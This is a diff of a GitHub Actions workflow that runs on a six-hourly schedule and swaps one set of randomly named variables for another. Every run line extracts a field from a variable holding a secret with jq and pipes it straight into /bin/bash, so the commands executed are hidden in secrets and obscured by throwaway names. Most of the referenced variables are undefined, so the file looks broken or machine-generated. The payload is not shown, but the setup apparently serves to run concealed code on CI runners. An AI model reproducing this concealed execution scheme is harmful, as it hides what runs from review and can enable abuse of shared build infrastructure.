@@ -1,10 +1,9 @@
 name: xinxiniangyin
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
-jobs:  # 23710
+    - cron: '11 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +11,16 @@ jobs:  # 23710
       - uses: actions/checkout@v4
       - name: xinxiniangyin
         env:
-          ydjf24019: ${{ secrets.ydjf24019 }}
+          zc5377: ${{ secrets.zc5377 }}
         run: |
-          echo $ydjf24019 | jq -r .bf2 | /bin/bash
-          echo $ov91 | jq -r .kigts8737 | /bin/bash
-          echo $vv349 | jq -r .ocifb84 | /bin/bash
-          echo $rpajl7465 | jq -r .yeyk2 | /bin/bash
-          echo $d1150 | jq -r .sf01144 | /bin/bash
-          echo $offlr8 | jq -r .pvv2 | /bin/bash
-          echo $atpn856 | jq -r .iaw7059 | /bin/bash
-          echo $odpx281 | jq -r .jn8 | /bin/bash
-          echo $ir0512 | jq -r .vhld3296 | /bin/bash
+          echo $zc5377 | jq -r .hlx60394 | /bin/bash
+          echo $kyz46284 | jq -r .nk9 | /bin/bash
+          echo $xfmb0 | jq -r .ztwn32899 | /bin/bash
+          echo $nx383 | jq -r .po8114 | /bin/bash
+          echo $au29 | jq -r .ssf2856 | /bin/bash
+          echo $widtv41 | jq -r .s79910 | /bin/bash
+          echo $w94 | jq -r .l91355 | /bin/bash
+          echo $m635 | jq -r .pttn56 | /bin/bash
+          echo $uqor41 | jq -r .m2 | /bin/bash
+          echo $osdx737 | jq -r .mwt8613 | /bin/bash
 
